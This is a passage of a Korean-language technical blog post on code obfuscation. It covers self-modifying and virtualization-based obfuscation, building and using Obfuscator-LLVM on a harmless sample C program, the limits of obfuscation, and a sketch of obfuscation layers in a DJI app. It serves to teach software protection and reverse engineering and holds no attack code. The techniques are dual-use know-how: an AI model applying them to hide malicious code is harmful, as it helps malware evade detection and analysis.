&#xB9F9;&#xAE00;&#xB9C1;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD568;&#xC218;&#xBA85;&#xACFC; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBCC0;&#xC218;&#xBA85;&#xC774; &#xBB34;&#xC791;&#xC704; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xC5B4; &#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC778;&#xC9C0; &#xD30C;&#xC545;&#xD558;&#xB294;&#xB370; &#xC2DC;&#xAC04;&#xC774; &#xBCF4;&#xB2E4; &#xC18C;&#xC694;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC694;&#xC998;&#xC5D0;&#xB294; &#xADF8;&#xB7F0;&#xB370; GPT &#xAC19;&#xC740; LLM&#xC5D0; &#xB123;&#xC5B4;&#xC8FC;&#xBA74; &#xB108;&#xBB34; &#xC798; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD30C;&#xC545;&#xD574;&#xC8FC;&#xAE34; &#xD558;&#xB354;&#xB77C;&#xAD6C;&#xC694; &#x314E;.&#x314E;&#x2026;</li></ul></li></ul></li><li><strong>Self-Modifying Code</strong><ul><li>&#xC2E4;&#xD589; &#xC911; &#xC790;&#xC2E0;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C;&#xB294; &#xC644;&#xC804;&#xD55C; &#xCF54;&#xB4DC; &#xAD6C;&#xC870;&#xB97C; &#xBCFC; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xAE30;&#xBC18; &#xB09C;&#xB3C5;&#xD654; (Virtualization Obfuscation)</strong><ul><li>&#xC790;&#xCCB4; &#xAC00;&#xC0C1; ISA&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC6D0;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xAC00;&#xC0C1;&#xBA38;&#xC2E0; &#xD574;&#xC11D; &#xB8E8;&#xD2F4; &#xC5C6;&#xC774; &#xC2E4;&#xC81C; &#xB85C;&#xC9C1;&#xC744; &#xC774;&#xD574;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#x1F50D; <em>&#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <strong>&#xBB34;&#xC5C7;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;&#xC9C0;</strong>&#xC870;&#xCC28;&#xB3C4; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</em></p><h2 id="3-Obfuscator-LLVM-&#xC2E4;&#xC2B5;"><a href="#3-Obfuscator-LLVM-&#xC2E4;&#xC2B5;" class="headerlink" title="3. Obfuscator-LLVM &#xC2E4;&#xC2B5;"></a>3. Obfuscator-LLVM &#xC2E4;&#xC2B5;</h2><p><strong>OLLVM(Obfuscator-LLVM)</strong> &#xC740;, &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; <strong>LLVM</strong>&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; <strong>&#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xB2A5; &#xD655;&#xC7A5;&#xD310;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; LLVM&#xC740; &#x201C;&#xD074;&#xB9B0;&#xD55C;&#x201D; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB370; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCD98; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xC5F0;&#xAD6C;&#xC9C4;&#xB4E4;&#xC774; LLVM&#xC758; &#xAD6C;&#xC870;&#xAC00; &#xC6CC;&#xB099; &#xC720;&#xC5F0;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0; &#xCC29;&#xC548;&#xD574;&#xC11C;, <strong>&#xCF54;&#xB4DC;&#xB97C; &#xBE61;&#xC138;&#xAC8C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB294; &#xAE30;&#xB2A5;</strong>&#xC744; &#xCD94;&#xAC00;&#xD55C; &#xBC84;&#xC804;&#xC744; &#xB9CC;&#xB4E4;&#xC5C8;&#xC8E0;. &#xADF8;&#xAC8C; &#xBC14;&#xB85C; OLLVM&#xC785;&#xB2C8;&#xB2E4;.</p><p>OLLVM&#xC740; C/C++ &#xCF54;&#xB4DC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD560; &#xB54C; <strong>&#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xB09C;&#xB3C5;&#xD654; &#xD328;&#xC2A4;(pass)</strong> &#xB97C; &#xAC70;&#xCE58;&#xBA74;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xBCC0;&#xD615;&#xD569;&#xB2C8;&#xB2E4;. &#xB355;&#xBD84;&#xC5D0; &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xB530;&#xB85C; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xD560; &#xD544;&#xC694; &#xC5C6;&#xC774;, &#xADF8;&#xB0E5; &#xCEF4;&#xD30C;&#xC77C;&#xB9CC; &#xB2E4;&#xB974;&#xAC8C; &#xD574;&#xB3C4; &#xAC15;&#xB825;&#xD55C; &#xB09C;&#xB3C5;&#xD654; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-1-OLLVM&#xC6A9;-Clang-&#xBE4C;&#xB4DC;-&#xBC29;&#xBC95;"><a href="#3-1-OLLVM&#xC6A9;-Clang-&#xBE4C;&#xB4DC;-&#xBC29;&#xBC95;" class="headerlink" title="3.1 OLLVM&#xC6A9; Clang &#xBE4C;&#xB4DC; &#xBC29;&#xBC95;"></a>3.1 OLLVM&#xC6A9; Clang &#xBE4C;&#xB4DC; &#xBC29;&#xBC95;</h3><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Installation">https://github.com/obfuscator-llvm/obfuscator/wiki/Installation</a></p><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build &amp;&amp; <span class="hljs-built_in">cd</span> build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/$ make -j7</code></pre><p>&#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC5D0;&#xB7EC;&#xAC00; &#xC880; &#xB098;&#xC11C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xC815;&#xD574;&#xC92C;&#xC5B4;&#xC694;. &#xD639;&#xC2DC; &#xC5D0;&#xB7EC;&#xAC00; &#xB098;&#xC2E0;&#xB2E4;&#xBA74; &#xB85C;&#xADF8; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xACE0; &#xD2B8;&#xB7EC;&#xBE14;&#xC288;&#xD305;&#xD574;&#xBCF4;&#xC138;&#xC694;.</p><p>obfuscator/tools/clang/lib/CodeGen/CGOpenMPRuntime.cpp:6275, 6321, 6400</p><p><code>error:lambda parameter &#x2018;CGF&#x2019; previously declared as a capture</code> </p><p>&#xC55E;&#xC5D0; &#xC788;&#xB294; <code>&amp;CGF</code> &#xC81C;&#xAC70;</p><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, &amp;CGF, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)&#x2193;<span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)</code></pre><p>obfuscator/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h:696</p><p><code>error: cannot convert</code></p><p><code>char</code> &#x2192; <code>uint8_t</code> &#xB85C; &#xBCC0;&#xD658;</p><pre><code class="hljs c"><span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">char</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }&#x2193;<span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">uint8_t</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }</code></pre><p><img src="image%209.png" alt="image.png"></p><p>&#xBE4C;&#xB4DC;&#xB97C; &#xC798;&#xD588;&#xC73C;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; OLLVM &#xC6A9; clang&#xC774; &#xC798; &#xB098;&#xD0C0;&#xB0A9;&#xB2C8;&#xB2E4;!</p><h3 id="3-2-OLLVM-&#xC0AC;&#xC6A9;&#xBC95;"><a href="#3-2-OLLVM-&#xC0AC;&#xC6A9;&#xBC95;" class="headerlink" title="3.2 OLLVM &#xC0AC;&#xC6A9;&#xBC95;"></a>3.2 OLLVM &#xC0AC;&#xC6A9;&#xBC95;</h3><p>Obfuscator-LLVM&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD55C; &#xBC29;&#xBC95;&#xC740;, Clang&#xC744; &#xD1B5;&#xD574; LLVM &#xBC31;&#xC5D4;&#xB4DC;(-mllvm)&#xC5D0; &#xD2B9;&#xC815; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC694; &#xD50C;&#xB798;&#xADF8;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Features">https://github.com/obfuscator-llvm/obfuscator/wiki/Features</a></p><ul><li><code>fla</code>: &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xD3C9;&#xD0C4;&#xD654;(Control Flow Flattening)</li><li><code>sub</code>: &#xBA85;&#xB839;&#xC5B4; &#xCE58;&#xD658;(Instruction Substitution)</li><li><code>bcf</code>: &#xAC00;&#xC9DC; &#xC81C;&#xC5B4; &#xD750;&#xB984;(Bogus Control Flow)</li></ul><p>&#xB610;, &#xD2B9;&#xC815; &#xD568;&#xC218;&#xC5D0;&#xB9CC; &#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; <a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Functions-annotations">&#xD568;&#xC218; &#xC5B4;&#xB178;&#xD14C;&#xC774;&#xC158;</a> &#xBC29;&#xBC95;&#xB3C4; &#xCC38;&#xACE0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-3-&#xC2E4;&#xC2B5;"><a href="#3-3-&#xC2E4;&#xC2B5;" class="headerlink" title="3.3 &#xC2E4;&#xC2B5;"></a>3.3 &#xC2E4;&#xC2B5;</h3><ul><li>&#xC608;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</li></ul><pre><code class="hljs c"><span class="hljs-comment">// flatten_example.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">secret_function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>{    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>) {        <span class="hljs-keyword">return</span> x * <span class="hljs-number">2</span>;    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">return</span> x - <span class="hljs-number">2</span>;    }}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">int</span> value = <span class="hljs-number">5</span>;    <span class="hljs-keyword">int</span> result = secret_function(value);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d\n&quot;</span>, result);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ clang flatten_example.c -o flatten_example_norm$ path_to_the/build/bin/clang -mllvm -fla flatten_example.c -o flatten_example_obf</code></pre><p>&#xB124; &#xC774;&#xC81C; IDA&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBE4C;&#xB4DC;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC67C;&#xCABD;&#xC774; <code>flatten_example_norm</code> &#xC774;&#xACE0; &#xC624;&#xB978;&#xCABD;&#xC774; <code>flatten_example_obf</code> &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xB41C; <code>secret_function</code> &#xCF54;&#xB4DC;</p><p><img src="image%2011.png" alt="image.png"></p><p><code>secret_function</code> &#xC758; CFG</p><p>&#xC544;&#xC8FC; &#xAC04;&#xB2E8;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC778;&#xB370; &#xBC8C;&#xC368;&#xBD80;&#xD130; &#xADF9;&#xBA85;&#xD55C; &#xCC28;&#xC774;&#xAC00; &#xBCF4;&#xC774;&#xC8E0;?</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB108;&#xBB34;&#xB098; &#xB2F9;&#xC5F0;&#xD55C; &#xC774;&#xC57C;&#xAE30;&#xC9C0;&#xB9CC; &#xC2E4;&#xD589;&#xACB0;&#xACFC;&#xB294; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2012.png" alt="image.png"></p><h2 id="4-&#xB9C8;&#xBB34;&#xB9AC;"><a href="#4-&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="4. &#xB9C8;&#xBB34;&#xB9AC;"></a>4. &#xB9C8;&#xBB34;&#xB9AC;</h2><h3 id="&#xD55C;&#xACC4;"><a href="#&#xD55C;&#xACC4;" class="headerlink" title="&#xD55C;&#xACC4;"></a>&#xD55C;&#xACC4;</h3><p>&#xBB3C;&#xB860; &#xB09C;&#xB3C5;&#xD654;&#xC5D0;&#xB3C4; &#xBA85;&#xD655;&#xD55C; &#xD55C;&#xACC4;&#xB294; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC131;&#xB2A5; &#xC800;&#xD558;:</strong> &#xB09C;&#xB3C5;&#xD654; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0BD;&#xC785;&#xB418;&#xB294; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xB85C;&#xC9C1;&#xC774;&#xB098; &#xBCF5;&#xC7A1;&#xD55C; &#xBD84;&#xAE30;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC131;&#xB2A5;&#xC744; &#xC800;&#xD558;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xB3C4;&#xAD6C; &#xBC1C;&#xC804;&#xC758; &#xC5ED;&#xC2B5;:</strong> &#xC815;&#xC801; &#xBD84;&#xC11D;&#xAE30;, &#xB514;&#xC635;&#xD4E8;&#xC2A4;&#xCF00;&#xC774;&#xD130;(Deobfuscator) &#xB4F1; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xB4E4;&#xB3C4; &#xB04A;&#xC784;&#xC5C6;&#xC774; &#xBC1C;&#xC804;&#xD558;&#xBA74;&#xC11C;, &#xC77C;&#xBD80; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xBE44;&#xAD50;&#xC801; &#xC27D;&#xAC8C; &#xBB34;&#xB825;&#xD654;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xBC95;&#xC801;&#xB7;&#xC724;&#xB9AC;&#xC801; &#xBB38;&#xC81C;:</strong> &#xC0C1;&#xC6A9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xACFC;&#xB3C4;&#xD55C; &#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xC801;&#xC6A9;&#xD560; &#xACBD;&#xC6B0;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2E0;&#xB8B0;&#xB97C; &#xC800;&#xD558;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB54C;&#xB85C;&#xB294; &#xBC95;&#xC801; &#xBD84;&#xC7C1;&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h3 id="&#xC758;&#xC758;"><a href="#&#xC758;&#xC758;" class="headerlink" title="&#xC758;&#xC758;"></a>&#xC758;&#xC758;</h3><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF8; &#xAC83;&#xCC98;&#xB7FC;, &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC740; &#xADF8; &#xC791;&#xB3D9; &#xBC29;&#xC2DD;&#xC5D0; &#xB530;&#xB77C; &#xD06C;&#xAC8C; <strong>&#xAD6C;&#xC870;&#xC801;(Structural)</strong>, <strong>&#xB370;&#xC774;&#xD130;(Data)</strong>, <strong>&#xC54C;&#xACE0;&#xB9AC;&#xC998;(Algorithm)</strong> &#xCE21;&#xBA74;&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC;, &#xC2E4;&#xC81C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBD84;&#xB958;&#xB97C; &#xB118;&#xC5B4;, &#xC774; &#xC138; &#xAC00;&#xC9C0; &#xC694;&#xC18C;&#xAC00; &#xBCF5;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xAE30;&#xB3C4; &#xD558;&#xACE0; &#xB354;&#xC6B1;&#xC774;, &#xAE30;&#xC874; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC758; &#xBCC0;&#xD615;&#xC740; &#xBB3C;&#xB860;, &#xC0C8;&#xB85C;&#xC6B4; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xB2E4;&#xC591;&#xD55C; &#xBCC0;&#xC885; &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xAFB8;&#xC900;&#xD788; &#xB4F1;&#xC7A5;&#xD558;&#xBA70; &#xBD84;&#xC11D;&#xC758; &#xBCF5;&#xC7A1;&#xC131;&#xC744; &#xB354;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xBE61;&#xC138;&#xAC8C; &#xAC78;&#xB824;&#xC788;&#xB2E4;&#xACE0; &#xC18C;&#xBB38;&#xB09C; &#xC0C1;&#xC6A9; &#xB4DC;&#xB860; DJI &#xC5D0;&#xC11C;&#xC758; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC77C;&#xBD80;&#xBD84;&#xB9CC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><strong>&#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654;</strong>: 8&#xAC1C;&#xC758; DEX &#xD30C;&#xC77C;&#xC744; 128KB &#xCCAD;&#xD06C; &#xB2E8;&#xC704;&#xB85C; &#xBD84;&#xD560;&#xD558;&#xACE0;, &#xAC01;&#xAC01;&#xC744; <strong>AES-256</strong>&#xC73C;&#xB85C; &#xC554;&#xD638;&#xD654;</li><li><strong>&#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654;</strong>: <code>com.dji.industry.pilot</code> &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xD558;&#xB4DC;&#xCF54;&#xB4DC;&#xB41C; &#xC0C1;&#xC218;&#xB97C; &#xC870;&#xD569;&#xD558;&#xC5EC; <strong>XOR &#xAE30;&#xBC18; &#xD0A4;</strong>&#xB97C; &#xC0DD;&#xC131;</li><li><strong>&#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654;</strong>: JNI &#xD638;&#xCD9C; &#xC2DC; <strong>3&#xB2E8;&#xACC4; &#xD2B8;&#xB7A8;&#xD384;&#xB9B0; &#xD568;&#xC218;</strong>&#xB97C; &#xAC70;&#xCCD0; &#xC2E4;&#xC81C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;</li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xD604;&#xB300;&#xC758; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xC220;&#xC740; &#xB2E8;&#xC77C; &#xAE30;&#xBC95;&#xC5D0; &#xBA38;&#xBB34;&#xB974;&#xC9C0; &#xC54A;&#xACE0; &#xB2E4;&#xCE35;&#xC801;&#xC774;&#xACE0; &#xBAA8;&#xB4C8;&#xD654;&#xB41C; &#xBCF4;&#xD638; &#xCCB4;&#xACC4;&#xB97C; &#xAC16;&#xCD94;&#xACE0; &#xC788;&#xC73C;&#xBA70;,  &#xB9E4;&#xB144; &#xC0C8;&#xB85C;&#xC6B4; &#xBCC0;&#xD615; &#xAE30;&#xBC95;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC744; &#xB354;&#xC6B1; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xB098;&#xC544;&#xAC00;, &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAE30;&#xBC18;&#xC758; &#xAC00;&#xC9DC; &#xCF54;&#xB4DC; &#xD328;&#xD134; &#xC0DD;&#xC131;&#xC774;&#xB098; &#xC591;&#xC790; &#xC554;&#xD638; &#xAE30;&#xC220;&#xC744; &#xD65C;&#xC6A9;&#xD55C; &#xD0A4; &#xAD50;&#xD658; &#xB4F1; &#xCC28;&#xC138;&#xB300; &#xAE30;&#xC220;&#xC744; &#xC2DC;&#xD5D8;&#xC801;&#xC73C;&#xB85C; &#xB3C4;&#xC785;&#xD558;&#xB294; &#xC0AC;&#xB840;&#xB3C4; &#xB4F1;&#xC7A5;&#xD558;&#xBA70; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xC220;&#xB3C4; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xAE30;&#xC220;&#xC758; &#xBC1C;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xBC1C;&#xC804;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 1,2,3&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA70; &#xACC4;&#xC18D;&#xD55C; &#xC774;&#xC57C;&#xAE30;&#xC9C0;&#xB9CC;, </p><blockquote><p>&#x201C;&#xBAA8;&#xB4E0; &#xBCF4;&#xD638; &#xACC4;&#xCE35;&#xC740; &#xC2DC;&#xAC04;&#xC744; &#xBC8C;&#xC5B4;&#xC8FC;&#xB294; &#xC7A5;&#xCE58;&#xC77C; &#xBFD0;, &#xAD81;&#xADF9;&#xC801;&#xC778; &#xC548;&#xC804;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xC9C0; &#xBABB;&#xD568;&#x201D;</p><ul><li>Quarkslab &#xB9AC;&#xC11C;&#xCE58; &#xD300;</li></ul></blockquote><p>&#xB09C;&#xB3C5;&#xD654;&#xC640; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xAE30;&#xC220;&#xC740; &#xACB0;&#xAD6D; <strong>&#xCF54;&#xB4DC;&#xB97C; &#xC9C0;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xC2F8;&#xC6C0;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC11C;&#xC640; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xB300;&#xACB0; &#xAD6C;&#xB3C4; &#xC18D;&#xC5D0;&#xC11C; &#xAE30;&#xC220;&#xC740; &#xB04A;&#xC784;&#xC5C6;&#xC774; &#xC9C4;&#xD654;&#xD558;&#xACE0;, &#xC774; &#xACFC;&#xC815;&#xC740; &#xBCF4;&#xC548; &#xAE30;&#xC220; &#xC804;&#xBC18;&#xC758; &#xBC1C;&#xC804;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xD569;&#xBC95;&#xC801;&#xC778; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBCF4;&#xD638;&#xBFD0; &#xC544;&#xB2C8;&#xB77C;, &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xD0D0;&#xC9C0; &#xD68C;&#xD53C;&#xC640; &#xBD84;&#xC11D; &#xC9C0;&#xC5F0;&#xC5D0;&#xB3C4; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>&#xACF5;&#xACA9;&#xACFC; &#xBC29;&#xC5B4; &#xC591;&#xCABD; &#xBAA8;&#xB450;&#xC5D0;&#xC11C; &#xD544;&#xC218;&#xC801;&#xC778; &#xAE30;&#xC220;</strong>&#xB85C; &#xC790;&#xB9AC; &#xC7A1;&#xC740; &#xC148;&#xC774;&#xC8E0;.</p><p>&#xB09C;&#xB3C5;&#xD654;&#xB294; &#xACF5;&#xACA9;&#xC744; &#xC9C0;&#xC5F0;&#xC2DC;&#xD0A4;&#xACE0; &#xBC29;&#xC5B4;&#xC758; &#xC2DC;&#xAC04;&#xC744; &#xBC8C;&#xC5B4;&#xC8FC;&#xB294; &#xC218;&#xB2E8;&#xC774;&#xC9C0;&#xB9CC;, &#xC644;&#xBCBD;&#xD55C; &#xBC29;&#xD328;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xC11D;&#xC790;&#xB294; &#xB048;&#xC9C8;&#xAE30;&#xAC8C; &#xD750;&#xB984;&#xC744; &#xCD94;&#xC801;&#xD558;&#xACE0; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xC120;&#xD558;&#xBA70;, &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC774;&#xC5D0; &#xB300;&#xC751;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC744; &#xCC3E;&#xC544;&#xB0B4; &#xBC29;&#xC5B4;&#xB97C; 